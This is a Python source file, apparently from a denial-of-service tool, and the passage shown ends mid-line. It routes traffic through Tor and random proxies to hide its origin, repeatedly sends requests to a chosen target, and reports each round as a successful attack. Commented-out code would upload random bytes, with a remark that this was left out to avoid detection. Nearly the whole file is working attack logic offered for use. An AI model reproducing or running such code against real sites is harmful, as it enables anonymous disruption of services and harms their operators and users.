import datetime
import sys
import random
from lib.color import color
from lib.tor import Tor

def main():
    counter = 0
    try:
        while counter < max_attempts:
            tor = Tor()
            if not tor.tor_installed():
                print('{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
                sys.exit(1)
            else:
                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
                counter += 1
                # Init a new Tor session
                with open('proxy.txt', 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                proxy = random.choice(proxies)
                session = tor.new_session(proxies={'http': proxy, 'https': proxy})
                print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
                print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
                # Getting data from the server
                print('{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
                session.get(target)
                # Putting data (omitted, maybe it makes detection easier)
                # random_bytes = random._urandom(1490)
                # print('{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
                # session.put(target, random_bytes)
                print('{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
    except KeyboardInterrupt:
        pass
    except Exception as exception:
        print('\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
        print('{}{}{}'.format(color.RED, exception, color.END))
    finally:
        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time,
